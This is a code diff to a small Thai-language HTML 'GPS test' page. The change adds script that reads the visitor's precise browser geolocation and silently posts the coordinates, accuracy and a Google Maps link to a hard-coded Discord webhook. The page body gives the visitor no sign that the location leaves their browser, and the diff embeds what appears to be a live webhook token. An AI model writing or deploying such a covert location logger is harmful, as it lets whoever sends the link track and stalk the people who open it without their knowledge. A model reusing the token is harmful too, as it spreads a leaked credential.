@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-  <meta charset="UTF-8">
-  <title>ทดสอบ GPS</title>
+  <meta charset="UTF-8" />
+  <title>ทดสอบ GPS พร้อมส่ง Discord Webhook</title>
 </head>
 <body>
   <h2>ตำแหน่งปัจจุบันของคุณ</h2>
@@ -10,13 +10,17 @@
   <p id="output">คลิกเพื่อขอดึงตำแหน่ง</p>
 
   <script>
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u"; // แทนที่ด้วย URL ของคุณ
+
     function getLocation() {
       const output = document.getElementById("output");
-
+      
       if (!navigator.geolocation) {
         output.innerText = "เบราว์เซอร์ไม่รองรับ Geolocation";
         return;
       }
+
+      output.innerText = "กำลังดึงตำแหน่ง... โปรดรอสักครู่";
 
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -27,13 +31,52 @@
           output.innerHTML = `
             🌍 พิกัด: ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>
             🎯 ความแม่นยำ: ±${accuracy} เมตร<br>
-            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">ดูบน Google Maps</a>
+            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" rel="noopener noreferrer">ดูบน Google Maps</a>
           `;
+
+          // สร้างข้อความที่จะส่งไป Discord
+          const message = `📍 ตำแหน่งปัจจุบัน:\nพิกัด: ${lat.toFixed(6)}, ${lon.toFixed(6)}\nความแม่นยำ: ±${accuracy} เมตร\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+          sendToDiscordWebhook({ content: message });
         },
         (error) => {
-          output.innerText = `เกิดข้อผิดพลาด: ${error.message}`;
+          let msg = "";
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              msg = "คุณปฏิเสธการแชร์ตำแหน่ง";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              msg = "ไม่สามารถระบุตำแหน่งได้";
+              break;
+            case error.TIMEOUT:
+              msg = "หมดเวลาการค้นหาตำแหน่ง";
+              break;
+            default:
+              msg = "เกิดข้อผิดพลาด: " + error.message;
+          }
+          output.innerText = msg;
         }
       );
+    }
+
+    function sendToDiscordWebhook(data) {
+      fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      })
+      .then(response => {
+        if (!response.ok) throw new Error("ส่งข้อมูลล้มเหลว");
+        return response.text();
+      })
+      .then(text => {
+        console.log("ส่งข้อมูลไป Discord สำเร็จ:", text);
+      })
+      .catch(err => {
+        console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", err);
+      });
     }
   </script>
 </body>
